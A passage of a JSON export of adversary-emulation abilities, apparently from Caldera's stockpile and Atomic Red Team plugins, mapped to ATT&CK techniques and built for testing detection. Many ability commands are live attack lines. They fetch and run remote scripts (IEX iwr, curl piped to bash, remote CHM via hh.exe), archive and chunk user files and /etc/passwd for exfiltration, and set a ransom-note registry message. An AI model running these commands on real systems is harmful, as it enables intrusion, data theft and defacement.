null, "platform": "darwin", "command": "arp -a", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.ipaddr", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "remote.host.ip"}]}, {"module": "plugins.stockpile.app.parsers.wifipref", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "scan.info"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "arp -a", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.ipaddr", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "remote.host.ip"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "arp -a", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.ipaddr", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "remote.host.ip"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "arp -a", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "85341c8c-4ecb-4579-8f53-43e3e91d7617", "technique_id": "T1018", "tactic": "discovery", "requirements": [{"relationship_match": [{"source": "no.logs"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}, {"relationship_match": [{"source": "fw.disabled"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Collect ARP details", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This module copies the data stored in the user's clipboard and writes it to a file, $env:TEMP\\atomic_T1115_clipboard_data.txt\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item \"$env:TEMP\\atomic_T1115_clipboard_data.txt\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Set-Clipboard -value \"Atomic T1115 Test, grab data from clipboard via VBA\"; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1115\\src\\T1115-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Clipboard Data", "ability_id": "abd5327a47c4994e2824f833eefe4250", "technique_id": "T1115", "tactic": "collection", "requirements": [], "name": "Collect Clipboard Data via VBA", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Simulate Raspberry Robin using the \"standard-in\" command prompt feature cmd `/R <` to read and execute a file via cmd.exe\nSee https://redcanary.com/blog/raspberry-robin/. \n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["07a87d_t1059.003_cmd.cmd"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cmd /r cmd<07a87d_t1059.003_cmd.cmd", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Windows Command Shell", "ability_id": "e71f5cb2d3a9b87877a7162c76c9a8da", "technique_id": "T1059.003", "tactic": "execution", "requirements": [], "name": "Command Prompt read contents from CMD file and execute", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may type in elaborate multi-line shell commands into a terminal session because they can't or don't wish to create script files on the host. The following command is a simple loop, echoing out Atomic Red Team was here!\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "for i in $(seq 1 5); do echo \"$i, Atomic Red Team was here!\"; sleep 1; done", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Bash", "ability_id": "4960dc6d42d2c82ac32c9c50b64de097", "technique_id": "T1059.004", "tactic": "execution", "requirements": [], "name": "Command line scripts", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.\n\nUpon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/art-fish.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash; wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/art-fish.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash; wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Bash", "ability_id": "8764d6c964901b9a56ca3ffe5e5a004a", "technique_id": "T1059.004", "tactic": "execution", "requirements": [], "name": "Command-Line Interface", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Compile C# code using csc.exe binary used by .NET\nUpon execution an exe named T1027.004.exe will be placed in the temp folder\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["af2f1c_calc.cs"], "parsers": [], "cleanup": ["del C:\\Windows\\Temp\\T1027.004.exe >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Windows\\Temp\\T1027.004.exe af2f1c_calc.cs", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Obfuscated Files or Information: Compile After Delivery", "ability_id": "f7e29cdc63759d523fca9d6a8178daa0", "technique_id": "T1027.004", "tactic": "defense-evasion", "requirements": [], "name": "Compile After Delivery using csc.exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses hh.exe to execute a local compiled HTML Help payload.\nUpon execution calc.exe will open\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["9e2e6f_T1218.001.chm"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "hh.exe 9e2e6f_T1218.001.chm", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Compiled HTML File", "ability_id": "bcdc2f68450358a50f50fa89410fa122", "technique_id": "T1218.001", "tactic": "defense-evasion", "requirements": [], "name": "Compiled HTML Help Local Payload", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses hh.exe to execute a remote compiled HTML Help payload.\nUpon execution displays an error saying the file cannot be open\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Compiled HTML File", "ability_id": "6d5da876fe45a933257a96c14c3132f0", "technique_id": "T1218.001", "tactic": "defense-evasion", "requirements": [], "name": "Compiled HTML Help Remote Payload", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Note: Requires 7zip installation\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if not exist \"%ProgramFiles%\\7-zip\\7z.exe\"  ( call ) ELSE ( echo Downloading 7-zip installer && bitsadmin /transfer myDownloadJob /download /priority normal \"https://www.7-zip.org/a/7z2002-x64.exe\" %TEMP%\\7zip.exe && %TEMP%\\7zip.exe /S ) &&   &&  mkdir $PathToAtomicsFolder\\T1560.001\\victim-files && cd $PathToAtomicsFolder\\T1560.001\\victim-files && echo \"This file will be encrypted\" > .\\encrypted_file.txt && \"%ProgramFiles%\\7-zip\\7z.exe\" u archive.7z *txt -pblue && dir", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Archive Collected Data: Archive via Utility", "ability_id": "f6b9e50c4a887e5975ec058ff9ea56ae", "technique_id": "T1560.001", "tactic": "collection", "requirements": [], "name": "Compress Data and lock with password for Exfiltration with 7zip", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Note: Requires winrar installation\nrar a -p\"blue\" hello.rar (VARIANT)\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if not exist \"%programfiles%/WinRAR/Rar.exe\"  ( call ) ELSE ( echo Downloading Winrar installer && bitsadmin /transfer myDownloadJob /download /priority normal \"https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe\" %TEMP%\\winrar.exe && %TEMP%\\winrar.exe /S ) &&   &&  mkdir .\\tmp\\victim-files && cd .\\tmp\\victim-files && echo \"This file will be encrypted\" > .\\encrypted_file.txt && \"%programfiles%/WinRAR/Rar.exe\" a -hp\"blue\" hello.rar && dir", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Archive Collected Data: Archive via Utility", "ability_id": "38a918787f583bb58b28ec495263d7b7", "technique_id": "T1560.001", "tactic": "collection", "requirements": [], "name": "Compress Data and lock with password for Exfiltration with winrar", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Note: Requires winzip installation\nwzzip sample.zip -s\"blueblue\" *.txt (VARIANT)\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "path=%path%;\"C:\\Program Files (x86)\\winzip\" && mkdir .\\tmp\\victim-files && cd .\\tmp\\victim-files && echo \"This file will be encrypted\" > .\\encrypted_file.txt && \"%ProgramFiles%\\WinZip\\winzip64.exe\" -min -a -s\"hello\" archive.zip * && dir", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Archive Collected Data: Archive via Utility", "ability_id": "6bab3d3a468266765c4a6f3857243136", "technique_id": "T1560.001", "tactic": "collection", "requirements": [], "name": "Compress Data and lock with password for Exfiltration with winzip", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the files from the $env:USERPROFILE directory compressed in a file called T1560-data-ps.zip in the $env:USERPROFILE directory \n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -path $env:USERPROFILE\\T1560-data-ps.zip -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\\T1560-data-ps.zip", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Archive Collected Data", "ability_id": "8cd2639cb742872b58a2356909628376", "technique_id": "T1560", "tactic": "collection", "requirements": [], "name": "Compress Data for Exfiltration With PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the txt files from the %USERPROFILE% directory compressed in a file called T1560.001-data.rar in the %USERPROFILE% directory \n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del /f /q /s %USERPROFILE%\\T1560.001-data.rar >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if not exist \"%programfiles%/WinRAR/Rar.exe\"  ( call ) ELSE ( echo Downloading Winrar installer && bitsadmin /transfer myDownloadJob /download /priority normal \"https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe\" %TEMP%\\winrar.exe && %TEMP%\\winrar.exe /S ) &&   &&  \"%programfiles%/WinRAR/Rar.exe\" a -r %USERPROFILE%\\T1560.001-data.rar %USERPROFILE%\\*.txt", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Archive Collected Data: Archive via Utility", "ability_id": "b42bac313bde7e1641452628af72b915", "technique_id": "T1560.001", "tactic": "collection", "requirements": [], "name": "Compress Data for Exfiltration With Rar", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This ability will compress a given git repository.", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm #{host.dir.git}.tar.gz;"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "tar -czf #{host.dir.git}.tar.gz -C \"#{host.dir.git}\" .; printf #{host.dir.git}.tar.gz;", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.compress"}]}], "cleanup": ["Remove-Item -Path #{host.dir.git}.tar.gz;"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "tar -czf #{host.dir.git}.tar.gz -C #{host.dir.git} *; Write-Host #{host.dir.git}.tar.gz; exit 0;", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Archive Collected Data: Archive via Utility", "ability_id": "2f90d4de-2612-4468-9251-b220e3727452", "technique_id": "T1560.001", "tactic": "exfiltration", "requirements": [{"relationship_match": [{"source": "sensitive.files"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}, {"relationship_match": [{"source": "host.dir.git"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Compress Git Repository", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This ability will compress the staged files into a password protected archive and break it\ninto smaller chunks based on the given byte size. The original archive will be automatically\ndeleted. Use this instead of other archiving abilities if small file sizes for exfiltration \nare desired. When used with an exfiltration ability, the exfiltration ability will run numerous\ntimes in an operation depending on how many chunks are created. \n", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.compress"}]}], "cleanup": ["find '#{host.dir.staged}' -maxdepth 1 -name 'calderachunk*' -exec rm -rf {} \\;"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "tar -C #{host.dir.staged} -czf - . | gpg -c --pinentry-mode=loopback --passphrase '#{host.archive.password}' > #{host.dir.staged}.tar.gz.gpg;\nsplit -b#{file.size.chunk} '#{host.dir.staged}.tar.gz.gpg' '#{host.dir.staged}'/calderachunk;\nrm '#{host.dir.staged}.tar.gz.gpg';\nfind '#{host.dir.staged}' -maxdepth 1 -name 'calderachunk*' 2>/dev/null;", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.compress"}]}], "cleanup": ["Get-ChildItem -Path \"$StageDir\\calderachunk*\" | Remove-Item;"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "& \"C:\\Program Files\\7-Zip\\7z.exe\" a \"#{host.dir.staged}.7z\" \"#{host.dir.staged}\\*\" '-p#{host.archive.password}' | Out-Null;\nsleep 2;\n$Archive = Get-Item -Path \"#{host.dir.staged}.7z\";\n$StageDir = \"#{host.dir.staged}\";\n$BaseName = $StageDir + \"\\calderachunk\";\n$UpperBound = [int32]\"#{file.size.chunk}\";\n$Content = [IO.File]::OpenRead($Archive);\n$buff = New-Object byte[] $UpperBound;\n$Bytes = $idx = 0;\ntry {\n    do {\n        $Bytes = $Content.Read($buff, 0, $buff.Length);\n        if ($Bytes -gt 0) {\n            $ChunkName = \"{0}{1}\" -f ($BaseName, $idx.ToString().PadLeft(3,'0'));\n            $ChunkFile = [IO.File]::OpenWrite($ChunkName);\n            try {\n                $ChunkFile.Write($buff, 0, $Bytes);\n            } finally {\n                $ChunkFile.Close();\n            }\n        }\n        $idx ++;\n    } while ($Bytes -gt 0)\n}\nfinally {\n    $Content.Close();\n}\nRemove-Item $Archive;\nGet-ChildItem -Path \"$StageDir\\calderachunk*\" | foreach {$_.FullName} | Select-Object;", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Data Transfer Size Limits", "ability_id": "5c5b0392-1daa-45e1-967c-2f361ce78849", "technique_id": "T1030", "tactic": "exfiltration", "requirements": [{"relationship_match": [{"source": "host.dir.staged"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Compress Staged Directory (Password Protected) and Split Into Smaller Chunks", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Compress a directory on the file system", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.compress"}]}], "cleanup": ["rm #{host.dir.staged}.tar.gz"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.compress"}]}], "cleanup": ["rm #{host.dir.staged}.tar.gz"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.compress"}]}], "cleanup": ["rm #{host.dir.staged}.zip"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;\nsleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.compress"}]}], "cleanup": ["rm #{host.dir.staged}.zip"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;\nsleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select", "language": null, "name": "pwsh", "variations": [], "uploads": []}], "technique_name": "Archive Collected Data: Archive via Utility", "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74", "technique_id": "T1560.001", "tactic": "exfiltration", "requirements": [{"relationship_match": [{"source": "sensitive.files"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Compress staged directory", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This ability packages staged files into a password-protected archive. Note - Requires 7Z for Windows and GPG version 2.1+ for Linux", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.compress"}]}], "cleanup": ["rm #{host.dir.staged}.tar.gz.gpg"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "tar -C #{host.dir.staged} -czf - . | gpg -c --pinentry-mode=loopback --passphrase #{host.archive.password} > #{host.dir.staged}.tar.gz.gpg && echo #{host.dir.staged}.tar.gz.gpg", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.basic", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "host.dir.compress"}]}], "cleanup": ["rm #{host.dir.staged}.7z"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "& \"C:\\Program Files\\7-Zip\\7z.exe\" a \"#{host.dir.staged}.7z\" \"#{host.dir.staged}\\*\" \"-p#{host.archive.password}\" | Out-Null;\nsleep 1; ls #{host.dir.staged}.7z | foreach {$_.FullName} | select", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Archive Collected Data: Archive via Utility", "ability_id": "30a8cf10-73dc-497c-8261-a64cc9e91505", "technique_id": "T1560.001", "tactic": "collection", "requirements": [{"relationship_match": [{"source": "host.dir.staged"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Compress staged directory (Password Protected)", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses GZip from Python to compress files\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/passwd.gz"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "$which_python -c \"import gzip;input_file=open('/etc/passwd', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('/tmp/passwd.gz','wb',compresslevel=6);output_file.write(content);output_file.close();\"", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Archive Collected Data: Archive via Library", "ability_id": "1885b5e55da2020dceaa387722f5c840", "technique_id": "T1560.002", "tactic": "collection", "requirements": [], "name": "Compressing data using GZip in Python (Linux)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses bz2 from Python to compress files\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/passwd.bz2"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "$which_python -c \"import bz2;input_file=open('/etc/passwd','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('/tmp/passwd.bz2','w+');output_file.write(str(bz2content));output_file.close();\"", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Archive Collected Data: Archive via Library", "ability_id": "432764d0dedab4bb423678865afc6508", "technique_id": "T1560.002", "tactic": "collection", "requirements": [], "name": "Compressing data using bz2 in Python (Linux)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses tarfile from Python to compress files\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/passwd.tar.gz"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "$which_python -c \"from zipfile import ZipFile; ZipFile('/tmp/passwd.tar.gz', mode='w').write('/etc/passwd')\"", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Archive Collected Data: Archive via Library", "ability_id": "6c9f0e04c02fe4ef258ece81317fbf9d", "technique_id": "T1560.002", "tactic": "collection", "requirements": [], "name": "Compressing data using tarfile in Python (Linux)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses zipfile from Python to compress files\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/passwd.zip"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "$which_python -c \"from zipfile import ZipFile; ZipFile('/tmp/passwd.zip', mode='w').write('/etc/passwd')\"", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Archive Collected Data: Archive via Library", "ability_id": "703e1a6310952c7382a88032ffe60185", "technique_id": "T1560.002", "tactic": "collection", "requirements": [], "name": "Compressing data using zipfile in Python (Linux)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Display ransom message to users at system start-up by configuring registry keys HKLM\\SOFTWARE\\Micosoft\\Windows\\CurrentVersion\\Policies\\System\\LegalNoticeCaption and HKLM\\SOFTWARE\\Micosoft\\Windows\\CurrentVersion\\Policies\\System\\LegalNoticeText.\n\n[SynAck Ransomware](https://www.trendmicro.com/vinfo/es/security/news/cybercrime-and-digital-threats/synack-ransomware-leverages-process-doppelg-nging-for-evasion-and-infection), \n[Grief Ransomware](https://redcanary.com/blog/grief-ransomware/), \n[Maze Ransomware](https://cyware.com/research-and-analysis/maze-ransomware-a-deadly-combination-of-data-theft-and-encryption-to-target-us-organizations-8f27),\n[Pysa Ransomware](https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-destructive-pysa-ransomware),\n[Spook Ransomware](https://community.fortinet.com/t5/FortiEDR/Threat-Coverage-How-FortiEDR-protects-against-Spook-Ransomware/ta-p/204226),\n[DopplePaymer Ransomware](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Dopplepaymer&threatId=-2147221958),\n[Reedemer Ransomware](https://blog.cyble.com/2022/07/20/redeemer-ransomware-back-action/),\n[Kangaroo Ransomware](https://www.bleepingcomputer.com/news/security/the-kangaroo-ransomware-not-only-encrypts-your-data-but-tries-to-lock-you-out-of-windows/)\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeCaption -Value $orgLegalNoticeCaption -Type String -Force; Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeText -Value $orgLegalNoticeText -Type String -Force"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$orgLegalNoticeCaption = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeCaption).LegalNoticeCaption; $orgLegalNoticeText = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeText).LegalNoticeText; $newLegalNoticeCaption = \"PYSA\"; $newLegalNoticeText = \"Hi Company, every byte on any types of your devices was encrypted. Don't try to use backups because it were encrypted too. To get all your data contact us:xxxx@onionmail.org\"; Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force; Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Defacement: Internal Defacement", "ability_id": "2fc2e45dde68ab78a97a22ca138652e1", "technique_id": "T1491.001", "tactic": "impact", "requirements": [], "name": "Configure LegalNoticeCaption and LegalNoticeText registry keys to display ransom message", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Enable traffic redirection.\n\nNote that this test may conflict with pre-existing system configuration.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["unset http_proxy; unset https_proxy"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "export", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["unset http_proxy; unset https_proxy"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "export", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Proxy: Internal Proxy", "ability_id": "e3dac029090c397b775979ddb50fc30f", "technique_id": "T1090.001", "tactic": "command-and-control", "requirements": [], "name": "Connection Proxy", "plugin": 